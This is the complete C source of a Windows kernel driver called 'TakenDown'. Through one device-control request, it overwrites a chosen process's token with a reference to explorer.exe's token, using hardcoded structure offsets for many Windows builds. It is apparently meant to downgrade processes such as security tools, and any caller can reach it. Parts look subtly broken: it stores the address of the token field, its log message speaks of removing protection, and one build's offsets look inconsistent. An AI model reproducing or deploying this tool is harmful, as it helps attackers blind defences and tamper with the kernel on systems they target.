#include <ntifs.h>
#include <ntstatus.h>
#include <minwindef.h>

#define DRIVER_NAME "TakenDown"
#define IOCTL_TOKEN_DOWN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp);
NTSTATUS DeviceIoControl(PDEVICE_OBJECT, PIRP Irp);
VOID DriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS GetOffsets();
PVOID FindExplorerToken();

ULONG TokenOffset = 0;
ULONG ImageFileNameOffset = 0x0;
ULONG ActiveProcessLinksOffset = 0x0;
typedef struct _Token {
	ULONG ProcessId;
} Token, * PToken;

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\TakenDown");
	UNICODE_STRING symbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\TakenDown");
	NTSTATUS status;
	PDEVICE_OBJECT DeviceObject = NULL;


	status = IoCreateDevice(
		DriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: Failed to create device: %08x\n", DRIVER_NAME, status);
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControl;
	DriverObject->DriverUnload = DriverUnload;

	status = IoCreateSymbolicLink(&symbolicLinkName, &deviceName);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: Failed to create symbolic link: %08x\n", DRIVER_NAME, status);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	if (GetOffsets() != STATUS_SUCCESS) {
		DbgPrint("[%s]: Unsupported Windows build\n", DRIVER_NAME);
		IoDeleteSymbolicLink(&symbolicLinkName);
		IoDeleteDevice(DeviceObject);
		return STATUS_UNSUCCESSFUL;
	}


	return STATUS_SUCCESS;
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING symbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\TakenDown");
	IoDeleteSymbolicLink(&symbolicLinkName);
	if (DeviceObject != NULL)
	{
		IoDeleteDevice(DeviceObject);
	}
	DbgPrint("[%s]: Driver unloaded\n", DRIVER_NAME);
}

PVOID FindExplorerToken() {
	PEPROCESS systemProcess = PsInitialSystemProcess;
	PEPROCESS currentProcess = systemProcess;

	do {
		UCHAR procName[15];

		RtlCopyMemory(procName, (PUCHAR)currentProcess + ImageFileNameOffset, sizeof(procName) - 1);
		procName[sizeof(procName) - 1] = '\0';

		if (_stricmp((const char*)procName, "explorer.exe") == 0) {
			PVOID explorerToken = (PVOID)((PUCHAR)currentProcess + TokenOffset);
			DbgPrint("[%s]: Found explorer.exe process at %p, token at %p\n", DRIVER_NAME, currentProcess, explorerToken);
			return explorerToken;
		}

		PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)currentProcess + ActiveProcessLinksOffset);
		currentProcess = (PEPROCESS)((PUCHAR)listEntry->Flink - ActiveProcessLinksOffset);
	} while (currentProcess != systemProcess);

	DbgPrint("[%s]: explorer.exe process not found\n", DRIVER_NAME);
	return NULL;
}

NTSTATUS GetOffsets() {
	RTL_OSVERSIONINFOW pversion;

	RtlGetVersion(&pversion);

	if (pversion.dwBuildNumber == 9600) {
		TokenOffset = 0x348;
		ImageFileNameOffset = 0x438;
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pversion.dwBuildNumber == 10240) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x448;
		ActiveProcessLinksOffset = 0x2f0;
	}
	else if (pversion.dwBuildNumber == 10586) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x450;
		ActiveProcessLinksOffset = 0x2f0;
	}
	else if (pversion.dwBuildNumber == 14393) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x450;
		ActiveProcessLinksOffset = 0x2f0;
	}
	else if (pversion.dwBuildNumber == 15063) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x450;
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pversion.dwBuildNumber == 16299) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x450;
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pversion.dwBuildNumber == 17134) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x450;
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pversion.dwBuildNumber == 17763) {
		TokenOffset = 0x358;
		ImageFileNameOffset = 0x16c;
		ActiveProcessLinksOffset = 0x188;
	}
	else if (pversion.dwBuildNumber == 18362) {
		TokenOffset = 0x360;
		ImageFileNameOffset = 0x450;
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pversion.dwBuildNumber >= 19041 && pversion.dwBuildNumber <= 22631) {
		TokenOffset = 0x4b8;
		ImageFileNameOffset = 0x5a8;
		ActiveProcessLinksOffset = 0x448;
	}
	else if (pversion.dwBuildNumber >= 26100) {
		TokenOffset = 0x248;
		ImageFileNameOffset = 0x338;
		ActiveProcessLinksOffset = 0x1d8;
	}
	else {
		TokenOffset = NULL;
		ImageFileNameOffset = NULL;
		ActiveProcessLinksOffset = NULL;
	}

	if (TokenOffset && ImageFileNameOffset && ActiveProcessLinksOffset)
		return STATUS_SUCCESS;

	DbgPrint("[%s]: Unsupported Windows build %lu.", DRIVER_NAME, pversion.dwBuildNumber);
	return STATUS_UNSUCCESSFUL;
}

NTSTATUS DeviceIoControl(PDEVICE_OBJECT, PIRP Irp)
{
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;
	BYTE ProtectionValue;

	if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_TOKEN_DOWN)
	{
		DbgPrint("[%s]: Removing PPL for the process", DRIVER_NAME);
		if (irpSp->Parameters.DeviceIoControl.InputBufferLength < sizeof(Token)) {
			status = STATUS_BUFFER_TOO_SMALL;
		}
		else {
			PToken token = (PToken)Irp->AssociatedIrp.SystemBuffer;
			
			PVOID explorerToken = FindExplorerToken();
			if (!explorerToken) {
				DbgPrint("[%s]: explorer.exe token not found\n", DRIVER_NAME);
				status = STATUS_NOT_FOUND;
			}
			else {
				PEPROCESS Process;

				status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)token->ProcessId, &Process);
				if (NT_SUCCESS(status)) {
					*(PVOID*)((PUCHAR)Process + TokenOffset) = explorerToken;

					ObDereferenceObject(Process);
					status = STATUS_SUCCESS;
				}
				else {
					DbgPrint("[%s]: Failed to find process with PID %lu: %08x\n", DRIVER_NAME, token->ProcessId, status);
					status = STATUS_NOT_FOUND;
				}
			}
		}
	}
	else {
		status = STATUS_INVALID_DEVICE_REQUEST;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
